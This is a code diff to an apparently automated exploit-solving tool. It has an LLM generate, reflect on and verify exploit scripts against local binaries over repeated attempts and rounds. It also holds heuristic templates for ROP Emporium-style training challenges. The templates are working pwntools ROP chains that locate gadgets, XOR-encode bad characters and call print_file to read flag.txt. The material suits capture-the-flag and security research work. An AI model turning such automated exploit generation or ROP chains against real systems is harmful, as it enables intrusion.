@@ -34,9 +34,10 @@ class SolveOrchestrator:
         binary_path = binary_path.resolve()
         ensure_executable(binary_path)
         iterations = max_iterations or self.config.max_iterations
+        inner_rounds = self.config.max_inner_rounds_per_attempt
         strict = self.config.strict_output if strict_output is None else strict_output
         prune = self.config.enable_pruning if enable_pruning is None else enable_pruning
-        print(f"[solve] solving {binary_path.name}", flush=True)
+        print(f"[solving] {binary_path.name}", flush=True)
 
         run_id = f"{sanitize_filename(binary_path.stem)}_{utc_timestamp().replace(':', '-')}"
         run_dir = self.config.artifact_root / run_id
@@ -55,14 +56,17 @@ class SolveOrchestrator:
         attempt_history: list[dict] = []
         solved = False
         success_attempt = None
+        success_round = None
         last_error = ""
         previous_code = ""
         reflection_text = ""
+        attempts_used = 0
 
         heuristic_code = _build_heuristic_exploit(analysis_report.to_dict())
         start_attempt = 1
         if heuristic_code:
-            print(f"[solve] {binary_path.name}: attempt 1 heuristic", flush=True)
+            attempts_used = 1
+            print(f"[solving] {binary_path.name}: attempt 1 heuristic", flush=True)
             attempt_dir = run_dir / "attempt_01"
             ensure_dir(attempt_dir)
             exploit_path = attempt_dir / "exploit.py"
@@ -110,10 +114,11 @@ class SolveOrchestrator:
             if ver.status == "success":
                 solved = True
                 success_attempt = 1
-                print(f"[solve] {binary_path.name}: solved on heuristic attempt", flush=True)
+                success_round = 1
+                print(f"[solving] {binary_path.name}: solved on heuristic attempt", flush=True)
             else:
                 print(
-                    f"[solve] {binary_path.name}: heuristic failed - {ver.failure_reason}",
+                    f"[solving] {binary_path.name}: heuristic failed - {ver.failure_reason}",
                     flush=True,
                 )
                 feedback = ver.feedback_payload
@@ -124,166 +129,231 @@ class SolveOrchestrator:
         for attempt in range(start_attempt, iterations + 1):
             if solved:
                 break
-            print(f"[solve] {binary_path.name}: attempt {attempt} llm", flush=True)
+            attempts_used = attempt
             attempt_dir = run_dir / f"attempt_{attempt:02d}"
             ensure_dir(attempt_dir)
-            generation_payload = {}
-            try:
-                if previous_code or attempt_history:
-                    print(f"[solve] {binary_path.name}: attempt {attempt} reflection", flush=True)
-                    reflection_text = self.generator.reflect(
+            attempt_feedback = feedback
+            attempt_previous_code = previous_code
+            attempt_reflection_text = reflection_text
+
+            for round_idx in range(1, inner_rounds + 1):
+                round_dir = attempt_dir / f"round_{round_idx:02d}"
+                ensure_dir(round_dir)
+                generation_payload = {}
+
+                try:
+                    print(
+                        f"[solving] {binary_path.name}: attempt {attempt} round {round_idx} llm",
+                        flush=True,
+                    )
+                    if attempt_previous_code or attempt_history:
+                        print(
+                            f"[solving] {binary_path.name}: attempt {attempt} round {round_idx} reflection",
+                            flush=True,
+                        )
+                        attempt_reflection_text = self.generator.reflect(
+                            analysis=analysis_report.to_dict(),
+                            attempt=attempt,
+                            feedback=attempt_feedback,
+                            previous_code=attempt_previous_code,
+                            attempt_history=attempt_history,
+                        )
+                        (round_dir / "Reflection.txt").write_text(
+                            attempt_reflection_text, encoding="utf-8"
+                        )
+                        (attempt_dir / "Reflection.txt").write_text(
+                            attempt_reflection_text, encoding="utf-8"
+                        )
+
+                    generation = self.generator.generate(
                         analysis=analysis_report.to_dict(),
                         attempt=attempt,
-                        feedback=feedback,
-                        previous_code=previous_code,
+                        feedback=attempt_feedback,
+                        strict_output=strict,
                         attempt_history=attempt_history,
+                        previous_code=attempt_previous_code,
+                        reflection_text=attempt_reflection_text,
                     )
-                    (attempt_dir / "Reflection.txt").write_text(reflection_text, encoding="utf-8")
-                generation = self.generator.generate(
-                    analysis=analysis_report.to_dict(),
-                    attempt=attempt,
-                    feedback=feedback,
-                    strict_output=strict,
-                    attempt_history=attempt_history,
-                    previous_code=previous_code,
-                    reflection_text=reflection_text,
-                )
-                generation_payload = generation.to_dict()
-                write_json(attempt_dir / "GenerationResult.json", generation_payload)
-                (attempt_dir / "raw_model_output.txt").write_text(
-                    generation.raw_text, encoding="utf-8"
-                )
-                exploit_path = attempt_dir / "exploit.py"
-                exploit_path.write_text(generation.code + "\n", encoding="utf-8")
-                code_quality_issue = _detect_code_quality_issue(generation.code)
-                if code_quality_issue:
-                    issue = {
+                    generation_payload = generation.to_dict()
+                    generation_payload["round"] = round_idx
+                    write_json(round_dir / "GenerationResult.json", generation_payload)
+                    write_json(attempt_dir / "GenerationResult.json", generation_payload)
+                    (round_dir / "raw_model_output.txt").write_text(
+                        generation.raw_text, encoding="utf-8"
+                    )
+                    (attempt_dir / "raw_model_output.txt").write_text(
+                        generation.raw_text, encoding="utf-8"
+                    )
+                    exploit_path = round_dir / "exploit.py"
+                    exploit_path.write_text(generation.code + "\n", encoding="utf-8")
+                    (attempt_dir / "exploit.py").write_text(generation.code + "\n", encoding="utf-8")
+                    attempt_previous_code = generation.code
+
+                    code_quality_issue = _detect_code_quality_issue(generation.code)
+                    if code_quality_issue:
+                        issue = {
+                            "attempt": attempt,
+                            "round": round_idx,
+                            "status": "generation_rejected",
+                            "error": code_quality_issue,
+                        }
+                        write_json(round_dir / "GenerationFailure.json", issue)
+                        write_json(attempt_dir / "GenerationFailure.json", issue)
+                        attempt_logs.append(issue)
+                        print(
+                            f"[solving] {binary_path.name}: attempt {attempt} round {round_idx} rejected - {code_quality_issue}",
+                            flush=True,
+                        )
+                        attempt_history.append(
+                            {
+                                "attempt": attempt,
+                                "round": round_idx,
+                                "phase": "generation",
+                                "status": "rejected",
+                                "failure_reason": code_quality_issue,
+                                "reflection_summary": attempt_reflection_text,
+                            }
+                        )
+                        attempt_feedback = {
+                            "attempt": attempt,
+                            "round": round_idx,
+                            "status": "generation_rejected",
+                            "error": code_quality_issue,
+                            "instruction": (
+                                "produce concrete runnable code without placeholders and make "
+                                "sure the script executes the target and prints its output"
+                            ),
+                        }
+                        last_error = code_quality_issue
+                        continue
+                except (LLMError, GenerationParseError) as exc:
+                    err = {
                         "attempt": attempt,
-                        "status": "generation_rejected",
-                        "error": code_quality_issue,
+                        "round": round_idx,
+                        "status": "generation_failed",
+                        "error": str(exc),
+                        "traceback": traceback.format_exc(limit=3),
                     }
-                    write_json(attempt_dir / "GenerationFailure.json", issue)
-                    attempt_logs.append(issue)
+                    write_json(round_dir / "GenerationFailure.json", err)
+                    write_json(attempt_dir / "GenerationFailure.json", err)
+                    attempt_logs.append(err)
                     print(
-                        f"[solve] {binary_path.name}: attempt {attempt} rejected - {code_quality_issue}",
+                        f"[solving] {binary_path.name}: attempt {attempt} round {round_idx} generation failed - {exc}",
                         flush=True,
                     )
                     attempt_history.append(
                         {
                             "attempt": attempt,
+                            "round": round_idx,
                             "phase": "generation",
-                            "status": "rejected",
-                            "failure_reason": code_quality_issue,
-                            "reflection_summary": reflection_text,
+                            "status": "failed",
+                            "failure_reason": str(exc),
+                            "reflection_summary": attempt_reflection_text,
                         }
                     )
-                    feedback = {
+                    attempt_feedback = {
                         "attempt": attempt,
-                        "status": "generation_rejected",
-                        "error": code_quality_issue,
-                        "instruction": "produce concrete runnable code without placeholders",
+                        "round": round_idx,
+                        "status": "generation_failed",
+                        "error": str(exc),
+                        "instruction": (
+                            "repair output format and provide runnable exploit code that "
+                            "executes the binary and captures output"
+                        ),
                     }
-                    last_error = code_quality_issue
+                    last_error = str(exc)
                     continue
-            except (LLMError, GenerationParseError) as exc:
-                err = {
-                    "attempt": attempt,
-                    "status": "generation_failed",
-                    "error": str(exc),
-                    "traceback": traceback.format_exc(limit=3),
-                }
-                write_json(attempt_dir / "GenerationFailure.json", err)
-                attempt_logs.append(err)
-                print(
-                    f"[solve] {binary_path.name}: attempt {attempt} generation failed - {exc}",
-                    flush=True,
-                )
-                attempt_history.append(
-                    {
+                except Exception as exc:  # noqa: BLE001
+                    err = {
                         "attempt": attempt,
-                        "phase": "generation",
-                        "status": "failed",
-                        "failure_reason": str(exc),
-                        "reflection_summary": reflection_text,
+                        "round": round_idx,
+                        "status": "unexpected_generation_error",
+                        "error": str(exc),
+                        "traceback": traceback.format_exc(limit=6),
                     }
-                )
-                feedback = {
-                    "attempt": attempt,
-                    "status": "generation_failed",
-                    "error": str(exc),
-                    "instruction": "repair output format and provide runnable exploit code",
-                }
-                last_error = str(exc)
-                continue
-            except Exception as exc:  # noqa: BLE001
-                err = {
-                    "attempt": attempt,
-                    "status": "unexpected_generation_error",
-                    "error": str(exc),
-                    "traceback": traceback.format_exc(limit=6),
-                }
-                write_json(attempt_dir / "GenerationFailure.json", err)
-                attempt_logs.append(err)
-                print(
-                    f"[solve] {binary_path.name}: attempt {attempt} unexpected generation error - {exc}",
-                    flush=True,
-                )
-                attempt_history.append(
-                    {
+                    write_json(round_dir / "GenerationFailure.json", err)
+                    write_json(attempt_dir / "GenerationFailure.json", err)
+                    attempt_logs.append(err)
+                    print(
+                        f"[solving] {binary_path.name}: attempt {attempt} round {round_idx} unexpected generation error - {exc}",
+                        flush=True,
+                    )
+                    attempt_history.append(
+                        {
+                            "attempt": attempt,
+                            "round": round_idx,
+                            "phase": "generation",
+                            "status": "unexpected_error",
+                            "failure_reason": str(exc),
+                            "reflection_summary": attempt_reflection_text,
+                        }
+                    )
+                    attempt_feedback = {
                         "attempt": attempt,
-                        "phase": "generation",
-                        "status": "unexpected_error",
-                        "failure_reason": str(exc),
-                        "reflection_summary": reflection_text,
+                        "round": round_idx,
+                        "status": "unexpected_generation_error",
+                        "error": str(exc),
                     }
+                    last_error = str(exc)
+                    continue
+
+                ver: VerificationResult = self.verifier.verify(
+                    binary_path=binary_path,
+                    exploit_path=exploit_path,
+                    attempt=attempt,
+                    success_regex=success_regex,
                 )
-                last_error = str(exc)
-                continue
+                ver.artifacts = {
+                    "exploit_path": str(exploit_path.resolve()),
+                    "attempt_dir": str(round_dir.resolve()),
+                    "outer_attempt_dir": str(attempt_dir.resolve()),
+                }
+                ver_payload = ver.to_dict()
+                ver_payload["round"] = round_idx
+                write_json(round_dir / "VerificationResult.json", ver_payload)
+                write_json(attempt_dir / "VerificationResult.json", ver_payload)
 
-            ver: VerificationResult = self.verifier.verify(
-                binary_path=binary_path,
-                exploit_path=exploit_path,
-                attempt=attempt,
-                success_regex=success_regex,
-            )
-            ver.artifacts = {
-                "exploit_path": str(exploit_path.resolve()),
-                "attempt_dir": str(attempt_dir.resolve()),
-            }
-            write_json(attempt_dir / "VerificationResult.json", ver.to_dict())
-
-            log_item = {
-                "attempt": attempt,
-                "generation_used_format_repair": generation_payload.get("used_format_repair", False),
-                "verification_status": ver.status,
-                "failure_reason": ver.failure_reason,
-                "success_reason": ver.success_reason,
-            }
-            attempt_logs.append(log_item)
-            attempt_history.append(
-                {
+                log_item = {
                     "attempt": attempt,
-                    "phase": "verification",
-                    "status": ver.status,
+                    "round": round_idx,
+                    "generation_used_format_repair": generation_payload.get("used_format_repair", False),
+                    "verification_status": ver.status,
                     "failure_reason": ver.failure_reason,
                     "success_reason": ver.success_reason,
-                    "reflection_summary": reflection_text,
                 }
-            )
+                attempt_logs.append(log_item)
+                attempt_history.append(
+                    {
+                        "attempt": attempt,
+                        "round": round_idx,
+                        "phase": "verification",
+                        "status": ver.status,
+                        "failure_reason": ver.failure_reason,
+                        "success_reason": ver.success_reason,
+                        "reflection_summary": attempt_reflection_text,
+                    }
+                )
 
-            if ver.status == "success":
-                solved = True
-                success_attempt = attempt
-                print(f"[solve] {binary_path.name}: solved on attempt {attempt}", flush=True)
-                break
+                if ver.status == "success":
+                    solved = True
+                    success_attempt = attempt
+                    success_round = round_idx
+                    print(
+                        f"[solving] {binary_path.name}: solved on attempt {attempt} round {round_idx}",
+                        flush=True,
+                    )
+                    break
 
-            feedback = ver.feedback_payload
-            last_error = ver.failure_reason
-            previous_code = generation.code
-            print(
-                f"[solve] {binary_path.name}: attempt {attempt} failed - {ver.failure_reason}",
-                flush=True,
-            )
+                attempt_feedback = ver.feedback_payload
+                last_error = ver.failure_reason
+                print(
+                    f"[solving] {binary_path.name}: attempt {attempt} round {round_idx} failed - {ver.failure_reason}",
+                    flush=True,
+                )
+
+            feedback = attempt_feedback
+            previous_code = attempt_previous_code
+            reflection_text = attempt_reflection_text
 
         elapsed = perf_counter() - t0
         summary = {
@@ -291,8 +361,10 @@ class SolveOrchestrator:
             "run_dir": str(run_dir.resolve()),
             "solved": solved,
             "success_attempt": success_attempt,
-            "attempts_used": len(attempt_logs),
+            "success_round": success_round,
+            "attempts_used": attempts_used,
             "max_iterations": iterations,
+            "max_inner_rounds_per_attempt": inner_rounds,
             "elapsed_seconds": round(elapsed, 3),
             "strict_output": strict,
             "enable_pruning": prune,
@@ -301,7 +373,7 @@ class SolveOrchestrator:
         }
         write_json(run_dir / "run_summary.json", summary)
         final_status = "SOLVED" if solved else "FAILED"
-        print(f"[solve] {binary_path.name}: {final_status}", flush=True)
+        print(f"[solving] {binary_path.name}: {final_status}", flush=True)
         return summary
 
 
@@ -514,7 +586,7 @@ def _build_split_heuristic(analysis: dict) -> str | None:
     if analysis.get("binary_name") != "rop_split":
         return None
 
-    return """import argparse
+    return f"""import argparse
 import re
 from pwn import ELF, ROP, context, p64, process
 
@@ -545,7 +617,7 @@ def main():
     output = io.recvall(timeout=2).decode(errors="replace")
     print(output)
 
-    if re.search(r"ROPE\\{[^}]+\\}|FLAG\\{[^}]+\\}|WIN\\b", output):
+    if re.search(r"ROPE\\{{[^}}]+\\}}|FLAG\\{{[^}}]+\\}}|WIN\\b", output):
         return
     raise SystemExit(1)
 
@@ -614,18 +686,16 @@ import subprocess
 from pwn import ELF, ROP, context, p64, process
 
 
-def find_gadget_addr(binary, needle_lines, return_offset=0):
+def find_gadget_addr(binary, needle):
     out = subprocess.check_output(["objdump", "-d", "-M", "intel", binary], text=True)
     lines = out.splitlines()
-    for idx in range(len(lines) - len(needle_lines) + 1):
-        ok = True
-        for off, needle in enumerate(needle_lines):
-            if needle not in lines[idx + off]:
-                ok = False
-                break
-        if ok:
-            return int(lines[idx + return_offset].split(":")[0].strip(), 16)
-    raise RuntimeError(f"gadget not found: {needle_lines}")
+    normalized_needle = "".join(needle.lower().split())
+    for idx, line in enumerate(lines[:-1]):
+        normalized_line = "".join(line.lower().split())
+        normalized_next = "".join(lines[idx + 1].lower().split())
+        if normalized_needle in normalized_line and normalized_next.endswith("ret"):
+            return int(line.split(":")[0].strip(), 16)
+    raise RuntimeError(f"gadget not found: {needle}")
 
 
 def main():
@@ -645,11 +715,7 @@ def main():
     pop_r14_r15 = rop.find_gadget(["pop r14", "pop r15", "ret"]).address
     pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
     ret = rop.find_gadget(["ret"]).address
-    mov_r14_r15 = find_gadget_addr(
-        binary,
-        ["pop r14", "pop r15", "ret", "mov    QWORD PTR [r14],r15", "ret"],
-        return_offset=3,
-    )
+    mov_r14_r15 = find_gadget_addr(binary, "mov qword ptr [r14],r15")
     print_file = elf.plt.get("print_file") or elf.symbols.get("print_file")
     target = b"flag.txt"
 
@@ -679,24 +745,21 @@ def _build_badchars_heuristic(analysis: dict) -> str | None:
     if analysis.get("binary_name") != "rop_badchars":
         return None
 
-    return """import argparse
+    useful_gadgets = next(
+        (item.get("snippet", "") for item in analysis.get("pruned_context", []) if item.get("function") == "usefulGadgets"),
+        "",
+    )
+    xor_match = re.search(r"^\s*([0-9a-f]+):.*xor\s+BYTE PTR \[r15\],r14b", useful_gadgets, re.MULTILINE)
+    mov_match = re.search(r"^\s*([0-9a-f]+):.*mov\s+QWORD PTR \[r13\+0x0\],r12", useful_gadgets, re.MULTILINE)
+    if not (xor_match and mov_match):
+        return None
+
+    xor_addr = int(xor_match.group(1), 16)
+    mov_addr = int(mov_match.group(1), 16)
+
+    return f"""import argparse
 import re
-import subprocess
 from pwn import ELF, ROP, context, p64, process
-
-
-def find_gadget_addr(binary, needle_lines, return_offset=0):
-    out = subprocess.check_output(["objdump", "-d", "-M", "intel", binary], text=True)
-    lines = out.splitlines()
-    for idx in range(len(lines) - len(needle_lines) + 1):
-        ok = True
-        for off, needle in enumerate(needle_lines):
-            if needle not in lines[idx + off]:
-                ok = False
-                break
-        if ok:
-            return int(lines[idx + return_offset].split(":")[0].strip(), 16)
-    raise RuntimeError(f"gadget not found: {needle_lines}")
 
 
 def xor_bytes(data, key):
@@ -722,16 +785,8 @@ def main():
     data_addr = elf.bss(0x80)
 
     pop_r12_r13_r14_r15 = rop.find_gadget(["pop r12", "pop r13", "pop r14", "pop r15", "ret"]).address
-    mov_r13_r12 = find_gadget_addr(
-        binary,
-        ["pop r12", "pop r13", "pop r14", "pop r15", "ret", "mov    QWORD PTR [r13],r12", "ret"],
-        return_offset=5,
-    )
-    xor_r15_r14b = find_gadget_addr(
-        binary,
-        ["pop r12", "pop r13", "pop r14", "pop r15", "ret", "xor    BYTE PTR [r15],r14b", "ret"],
-        return_offset=5,
-    )
+    mov_r13_r12 = {mov_addr}
+    xor_r15_r14b = {xor_addr}
     pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
     ret = rop.find_gadget(["ret"]).address
     print_file = elf.plt.get("print_file") or elf.symbols.get("print_file")
@@ -757,11 +812,12 @@ def main():
     payload += p64(print_file)
 
     io = process(binary)
+    io.recvuntil(b"> ", timeout=1)
     io.sendline(payload)
     output = io.recvall(timeout=2).decode(errors="replace")
     print(output)
 
-    if re.search(r"ROPE\\{[^}]+\\}|FLAG\\{[^}]+\\}|WIN\\b", output):
+    if re.search(r"ROPE\\{{[^}}]+\\}}|FLAG\\{{[^}}]+\\}}|WIN\\b", output):
         return
     raise SystemExit(1)
 
@@ -778,8 +834,12 @@ def _infer_heuristic_strategy(code: str) -> str:
         return "heuristic_callme"
     if '"/bin/cat flag.txt"' in code or "system =" in code:
         return "heuristic_split"
-    if "xor byte ptr [r15], r14b" in code:
+    if (
+        "xor byte ptr [r15],r14b" in code
+        or 'find_gadget_addr(binary, "xor byte ptr [r15],r14b")' in code
+        or ("xor_r15_r14b =" in code and "mov_r13_r12 =" in code and 'target = b"flag.txt"' in code)
+    ):
         return "heuristic_badchars"
-    if "mov qword ptr [r14], r15" in code and "print_file" in code:
+    if 'find_gadget_addr(binary, "mov qword ptr [r14],r15")' in code and "print_file" in code:
         return "heuristic_write4"
     return "heuristic_branch_input"
